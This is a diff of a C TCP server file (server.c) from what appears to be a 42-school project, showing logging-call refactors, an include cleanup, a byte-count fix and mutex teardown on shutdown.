@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   server.c                                           :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
+/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 03:19:03 by root              #+#    #+#             */
-/*   Updated: 2018/09/27 09:32:05 by root             ###   ########.fr       */
+/*   Updated: 2019/05/12 18:08:13 by gbourgeo         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,10 +16,10 @@
 #include <netdb.h>
 /* inet_ntop */
 #include <arpa/inet.h>
-							#include <stdio.h>
-							#include <errno.h>
+/* mutex */
+#include <pthread.h>
+
 #include "main.h"
-#include "durex.h"
 
 static int			openSocket(struct addrinfo *p)
 {
@@ -53,7 +53,7 @@ int					openServer(const char *addr, const char *port)
 	hints.ai_socktype = SOCK_STREAM;
 	hints.ai_protocol = IPPROTO_TCP;
 	if ((errcode = getaddrinfo(addr, port, &hints, &res))) {
-		serverLog("[ERROR] - %s", gai_strerror(errcode));
+		serverLog(1, "[ERROR] - %s\n", gai_strerror(errcode));
 		return (-1);
 	}
 	fd = -1;
@@ -67,7 +67,7 @@ int					openServer(const char *addr, const char *port)
 	}
 	freeaddrinfo(res);
 	if (p == NULL || fd < 0) {
-		serverLog("[ERROR] - Address or Socket can't be found.");
+		serverLog(1, "[ERROR] - Address or Socket can't be found.\n");
 		return (-1);
 	}
 	return e.server.fd = fd;
@@ -81,7 +81,7 @@ void					serverAcceptConnections()
 
 	fd = accept(e.server.fd, &csin, &len);
 	if (fd < 0) {
-		serverLog("[ERROR] - Accept failed.");
+		serverLog(1, "[ERROR] - Accept failed.\n");
 		return ;
 	}
 	for (int i = 0; i < SERVER_CLIENT_MAX; i++) {
@@ -92,13 +92,13 @@ void					serverAcceptConnections()
 						e.server.client[i].port, NI_MAXSERV, NI_NUMERICSERV);
 			inet_ntop(AF_INET, &((struct sockaddr_in *)&csin)->sin_addr.s_addr,
 					  e.server.client[i].addr, sizeof(e.server.client[i].addr));
-			serverLog("[LOGS] - New connection from %s:%s (%s)", e.server.client[i].addr,
+			serverLog(1, "[LOGS] - New connection from %s:%s (%s)\n", e.server.client[i].addr,
 					  e.server.client[i].port, e.server.client[i].host);
 			clientWrite("Pass: ", &e.server.client[i]);
 			return ;
 		}
 	}
-	write(fd, "Server Full\n", 13);
+	write(fd, "Server Full\n", 12);
 	close(fd);
 }
 
@@ -159,6 +159,7 @@ void				serverReadClient(t_cl *client)
 	int				ret;
 
 	ret = read(client->fd, buff, SERVER_CLIENT_BUFF);
+	// serverLog(1, "Client read = %d\n", ret);
 	if (ret <= 0)
 		return serverQuitClient(client, NULL);
 	buff[ret] = '\0';
@@ -210,11 +211,12 @@ void				quitClearlyServer()
 		clearClient(&e.server.client[i]);
 	}
 	if (e.server.fd != -1) {
-		serverLog("[INFO] - Closing server...");
+		serverLog(1, "[INFO] - Closing server...\n");
 		close(e.server.fd);
 	}
 	if (e.server.reporter != -1) {
-		serverLog("[INFO] - Firing reporter...");		
+		serverLog(1, "[INFO] - Firing reporter...\n");		
 		close(e.server.reporter);
 	}
+	pthread_mutex_destroy(&e.server.mutex);
 }
